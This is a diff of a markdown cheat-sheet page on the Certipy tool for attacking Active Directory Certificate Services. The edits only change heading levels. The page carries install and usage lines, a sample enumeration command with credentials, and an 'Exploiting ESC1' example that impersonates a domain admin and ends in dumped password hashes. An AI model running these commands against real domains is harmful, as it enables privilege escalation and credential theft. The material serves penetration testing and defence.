@@ -13,20 +13,20 @@ tags : ['Other', 'Active Directory', 'ADCS']
 
 Active Directory Certificate Services enumeration and abuse.
 
-### Installation
+## Installation
 
 ```plain
 git clone https://github.com/ly4k/Certipy
 sudo python3 setup.py install
 ```
 
-### Usage
+## Usage
 
 ```plain
 certipy [-v] [-h] {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template} ...
 ```
 
-### Flags
+## Flags
 
 ```plain
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -53,11 +53,11 @@ options:
   -h, --help            Show this help message and exit
 ```
 
-### Examples
+## Examples
 
 For more examples please check the [Github Repo](https://github.com/ly4k/Certipy).
 
-#### Finding CA
+### Finding CA
 
 ```plain
 $ certipy find -u crypt0rr@offsec.nl -p Welkom1234 -dc-ip 10.10.10.10
@@ -75,7 +75,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Saved JSON output to '202210114803_Certipy.json'
 ```
 
-#### Exploiting ESC1
+### Exploiting ESC1
 
 ```plain
 $ certipy req -u 'crypt0rr.offsec.nl' -p 'Welkom1234' -target 'dc01.offsec.nl' -ca 'CA01-OFFSEC' -template 'ESC1' -upn 'john-da@offsec.nl'
@@ -110,6 +110,6 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [...]
 ```
 
-### URL list
+## URL List
 
 * [Github.com - Certipy](https://github.com/ly4k/Certipy)
